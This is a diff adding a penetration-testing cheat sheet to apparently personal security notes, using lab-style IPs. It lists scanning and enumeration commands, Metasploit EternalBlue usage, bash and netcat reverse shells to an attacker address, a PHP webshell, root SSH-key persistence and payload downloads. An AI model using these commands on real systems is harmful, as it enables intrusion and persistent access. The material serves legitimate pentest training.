@@ -13,6 +13,10 @@
 | 445 (TCP)     | SMB                   | Server Message Block — file/printer sharing (Windows networks)          |
 | 3389 (TCP)    | RDP                   | Remote Desktop Protocol — remote access to Windows desktops/servers     |
 
+- SSH: Secure, encrypted connection to a remote system; requires credentials. Used for safe remote login and file transfer.
+
+- Netcat: Raw, unencrypted network tool; can send/receive data freely. Used for testing, debugging, or simple file transfer.
+
 # 🔎 Nuclei Tool 
 
 Nuclei is an open-source, template-based vulnerability scanner widely used in penetration testing and bug bounty hunting.
@@ -156,6 +160,119 @@ CNAME Record
 | **27**   | FileBlock Executable (execution blocked by Sysmon config)                                    |
 | **28**   | FileBlock Shredding (file overwrite prevention)                                              |
 | **29**   | FileBlock Unauthorized (file creation blocked)
+
+# Cheat Sheet
+
+## General
+| Command | Description |
+|---------|-------------|
+| `sudo openvpn user.ovpn` | Connect to VPN |
+| `ifconfig` / `ip a` | Show our IP address |
+| `netstat -rn` | Show networks accessible via the VPN |
+| `ssh user@10.10.10.10` | SSH to a remote server |
+| `ftp 10.129.42.253` | FTP to a remote server |
+
+## Tmux
+| Command | Description |
+|---------|-------------|
+| `tmux` | Start tmux |
+| `Ctrl+b` | tmux: default prefix |
+| `prefix c` | tmux: new window |
+| `prefix 1` | tmux: switch to window (1) |
+| `prefix Shift+%` | tmux: split pane vertically |
+| `prefix Shift+"` | tmux: split pane horizontally |
+| `prefix →` | tmux: switch to the right pane |
+
+## Vim
+| Command | Description |
+|---------|-------------|
+| `vim file` | open file with vim |
+| `Esc i` | enter insert mode |
+| `Esc` | back to normal mode |
+| `x` | cut character |
+| `dw` | cut word |
+| `dd` | cut full line |
+| `yw` | copy word |
+| `yy` | copy full line |
+| `p` | paste |
+| `:1` | go to line number 1 |
+| `:w` | write file (save) |
+| `:q` | quit |
+| `:q!` | quit without saving |
+| `:wq` | write and quit |
+
+## Pentesting
+
+### Service Scanning
+| Command | Description |
+|---------|-------------|
+| `nmap 10.129.42.253` | Run nmap on an IP |
+| `nmap -sV -sC -p- 10.129.42.253` | Run an nmap script scan on an IP |
+| `locate scripts/citrix` | List various available nmap scripts |
+| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |
+| `netcat 10.10.10.10 22` | Grab banner of an open port |
+| `smbclient -N -L \\\\10.129.42.253` | List SMB Shares |
+| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
+| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
+| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP community string |
+
+### Web Enumeration
+| Command | Description |
+|---------|-------------|
+| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Directory scan |
+| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Sub-domain scan |
+| `curl -IL https://www.inlanefreight.com` | Grab website banner |
+| `whatweb 10.10.10.121` | Webserver/cert details |
+| `curl 10.10.10.121/robots.txt` | List potential directories in robots.txt |
+| `Ctrl+U` (in Firefox) | View page source |
+
+### Public Exploits / Metasploit
+| Command | Description |
+|---------|-------------|
+| `searchsploit openssh 7.2` | Search public exploits |
+| `msfconsole` | Start Metasploit Framework |
+| `search exploit eternalblue` | Search MSF for exploit |
+| `use exploit/windows/smb/ms17_010_psexec` | Use an MSF module |
+| `show options` | Show module options |
+| `set RHOSTS 10.10.10.40` | Set module option |
+| `check` | Test if target is vulnerable |
+| `exploit` | Run the exploit |
+
+### Using Shells
+| Command | Description |
+|---------|-------------|
+| `nc -lvnp 1234` | Start nc listener |
+| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Reverse shell from remote |
+| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f` | Reverse shell (alternative) |
+| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f` | Start bind shell locally |
+| `nc 10.10.10.1 1234` | Connect to bind shell |
+| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (method 1) |
+| `Ctrl+Z` then `stty raw -echo` then `fg` then Enter twice | Upgrade shell TTY (method 2) |
+| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create PHP webshell |
+| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute command on webshell |
+
+### Privilege Escalation
+| Command | Description |
+|---------|-------------|
+| `./linpeas.sh` | Run linPEAS enumeration |
+| `sudo -l` | List available sudo privileges |
+| `sudo -u user /bin/echo Hello World!` | Run command as another user via sudo |
+| `sudo su -` | Switch to root user (if allowed) |
+| `sudo su user -` | Switch to a user |
+| `ssh-keygen -f key` | Create SSH key |
+| `echo "ssh-rsa AAAAB... user@host" >> /root/.ssh/authorized_keys` | Add pubkey to authorized_keys |
+| `ssh root@10.10.10.10 -i key` | SSH with private key |
+
+### Transferring Files
+| Command | Description |
+|---------|-------------|
+| `python3 -m http.server 8000` | Start a local HTTP server |
+| `wget http://10.10.14.1:8000/linpeas.sh` | Download file on remote from local server |
+| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download file on remote from local server |
+| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer file with SCP (requires SSH) |
+| `base64 file -w 0` | Convert file to base64 (no linewrap) |
+| `echo f0VMR... | base64 -d > shell` | Decode base64 to file |
+| `md5sum shell` | Check file MD5 sum |
 
 
 
